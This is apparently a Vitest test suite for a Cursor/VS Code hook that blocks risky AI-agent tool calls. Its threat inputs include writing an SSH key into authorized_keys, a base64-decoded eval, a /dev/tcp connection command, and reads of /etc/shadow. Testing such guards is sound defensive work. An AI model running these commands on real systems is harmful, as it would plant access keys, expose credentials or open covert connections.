/// <reference types="node" />

import { execFile } from "node:child_process";
import { resolve } from "node:path";
import { describe, expect, it } from "vitest";

const DIST_DIR = resolve(__dirname, "..", "..", "dist");
const AIDR_HOOK = resolve(DIST_DIR, "aidr-hook.cjs");
type HookMode = "cursor" | "vscode";

function runHook(
	mode: HookMode,
	input: Record<string, unknown> | string | Buffer,
): Promise<{ stdout: string; stderr: string; code: number | null }> {
	return new Promise((resolveRun) => {
		const child = execFile("node", [AIDR_HOOK, mode], (error, stdout, stderr) => {
			resolveRun({ stdout, stderr, code: error?.code ? Number(error.code) : child.exitCode });
		});
		const stdin = Buffer.isBuffer(input)
			? input
			: typeof input === "string"
				? input
				: JSON.stringify(input);
		child.stdin?.end(stdin);
	});
}

function parseResponse(stdout: string): Record<string, unknown> {
	return JSON.parse(stdout.trim()) as Record<string, unknown>;
}

/**
 * VS Code / Cursor hooks express a block through
 * `hookSpecificOutput.permissionDecision` and signal "allow" by returning an
 * empty object. Local enforcement is the documented default, so threat payloads
 * must produce a block here.
 */
function permissionDecision(stdout: string): string | undefined {
	const response = parseResponse(stdout);
	const hookOutput = response.hookSpecificOutput as Record<string, unknown> | undefined;
	return hookOutput?.permissionDecision as string | undefined;
}

describe("Cursor hook integration", () => {
	it("allows clean preToolUse write", async () => {
		const { stdout, code } = await runHook("cursor", {
			hook_event_name: "preToolUse",
			tool_name: "Write",
			tool_input: {
				file_path: "/tmp/notes.txt",
				content: "just some notes",
			},
		});

		expect(code).toBe(0);
		const response = parseResponse(stdout);
		expect(response.decision).toBe("allow");
	});

	it("parses UTF-16LE stdin payloads (Windows hook launcher)", async () => {
		const payload = {
			hook_event_name: "preToolUse",
			tool_name: "Write",
			tool_input: {
				file_path: "/home/user/.ssh/authorized_keys",
				content: "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQ...",
			},
		};

		const { stdout, code } = await runHook(
			"cursor",
			Buffer.from(JSON.stringify(payload), "utf16le"),
		);

		expect(code).toBe(0);
		const response = parseResponse(stdout);
		// Local enforcement is the documented default; these payloads are threats.
		expect(response.decision).toBe("deny");
	});

	it("denies sensitive write in preToolUse", async () => {
		const { stdout, code } = await runHook("cursor", {
			hook_event_name: "preToolUse",
			tool_name: "Write",
			tool_input: {
				file_path: "/home/user/.ssh/authorized_keys",
				content: "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQ...",
			},
		});

		expect(code).toBe(0);
		const response = parseResponse(stdout);
		// Local enforcement is the documented default; these payloads are threats.
		expect(response.decision).toBe("deny");
	});

	it("denies Edit payloads that use path + streamContent fields", async () => {
		const { stdout, code } = await runHook("cursor", {
			hook_event_name: "preToolUse",
			tool_name: "Edit",
			tool_input: {
				path: "/tmp/edit-streamcontent.txt",
				streamContent: "eval $(base64 --decode <<< YWJj)",
			},
		});

		expect(code).toBe(0);
		const response = parseResponse(stdout);
		// Local enforcement is the documented default; these payloads are threats.
		expect(response.decision).toBe("deny");
	});

	it("denies suspicious shell command", async () => {
		const { stdout, code } = await runHook("cursor", {
			hook_event_name: "beforeShellExecution",
			command: "cat /dev/tcp/192.0.2.1/80",
			cwd: "/tmp",
		});

		const response = parseResponse(stdout);
		// Local enforcement is the documented default; these payloads are threats.
		expect(response.permission).toBe("deny");
		expect(code).toBe(0);
	});

	it("denies sensitive file read", async () => {
		const { stdout, code } = await runHook("cursor", {
			hook_event_name: "beforeReadFile",
			file_path: "/home/user/.ssh/authorized_keys",
			content: "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQ...",
			attachments: [],
		});

		expect(code).toBe(0);
		const response = parseResponse(stdout);
		// Local enforcement is the documented default; these payloads are threats.
		expect(response.permission).toBe("deny");
	});

	it("allows benign mcp call", async () => {
		const { stdout, code } = await runHook("cursor", {
			hook_event_name: "beforeMCPExecution",
			tool_name: "MCP",
			tool_input: {
				query: "repo metadata",
			},
		});

		expect(code).toBe(0);
		const response = parseResponse(stdout);
		expect(response.permission).toBe("allow");
	});

	it("fails closed on invalid json", async () => {
		const { stdout, code } = await runHook("cursor", "not valid json");

		expect(code).toBe(0);
		expect(parseResponse(stdout)).toEqual({
			decision: "deny",
			permission: "deny",
			reason: "Singularity AIDR could not identify hook event.",
			user_message: "Singularity AIDR could not identify hook event.",
			agent_message: "Singularity AIDR internal error policy applied.",
		});
	});
});

describe("VS Code hook integration", () => {
	it("allows clean PreToolUse write", async () => {
		const { stdout, code } = await runHook("vscode", {
			tool_name: "Write",
			tool_input: {
				file_path: "/tmp/notes.txt",
				content: "just some notes",
			},
		});

		expect(code).toBe(0);
		expect(parseResponse(stdout)).toEqual({});
	});

	it("returns blocking verdict for sensitive write", async () => {
		const { stdout, code } = await runHook("vscode", {
			tool_name: "Write",
			tool_input: {
				file_path: "/home/user/.ssh/authorized_keys",
				content: "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQ...",
			},
		});

		expect(code).toBe(0);
		expect(permissionDecision(stdout)).toBe("deny");
	});

	it("denies read of sensitive file", async () => {
		const { stdout, code } = await runHook("vscode", {
			tool_name: "Read",
			tool_input: { file_path: "/etc/shadow" },
		});

		expect(code).toBe(0);
		expect(permissionDecision(stdout)).toBe("deny");
	});

	it("allows read of benign file", async () => {
		const { stdout, code } = await runHook("vscode", {
			tool_name: "Read",
			tool_input: { file_path: "/tmp/notes.txt" },
		});

		expect(code).toBe(0);
		expect(parseResponse(stdout)).toEqual({});
	});

	it("denies delete of sensitive file", async () => {
		const { stdout, code } = await runHook("vscode", {
			tool_name: "Delete",
			tool_input: { file_path: "/home/user/.ssh/authorized_keys" },
		});

		expect(code).toBe(0);
		expect(permissionDecision(stdout)).toBe("deny");
	});

	it("allows delete of benign file", async () => {
		const { stdout, code } = await runHook("vscode", {
			tool_name: "Delete",
			tool_input: { file_path: "/tmp/scratch.txt" },
		});

		expect(code).toBe(0);
		expect(parseResponse(stdout)).toEqual({});
	});

	it("denies read with variant key name 'filePath'", async () => {
		const { stdout, code } = await runHook("vscode", {
			tool_name: "Read",
			tool_input: { filePath: "/etc/shadow" },
		});

		expect(code).toBe(0);
		expect(permissionDecision(stdout)).toBe("deny");
	});

	it("denies delete with variant key name 'path'", async () => {
		const { stdout, code } = await runHook("vscode", {
			tool_name: "Delete",
			tool_input: { path: "/home/user/.ssh/authorized_keys" },
		});

		expect(code).toBe(0);
		expect(permissionDecision(stdout)).toBe("deny");
	});

	it("fails closed on invalid json", async () => {
		const { stdout, code } = await runHook("vscode", "not valid json");

		expect(code).toBe(0);
		expect(parseResponse(stdout)).toEqual({
			hookSpecificOutput: {
				hookEventName: "PreToolUse",
				permissionDecision: "deny",
				permissionDecisionReason: "Singularity AIDR could not normalize hook payload.",
			},
		});
	});
});
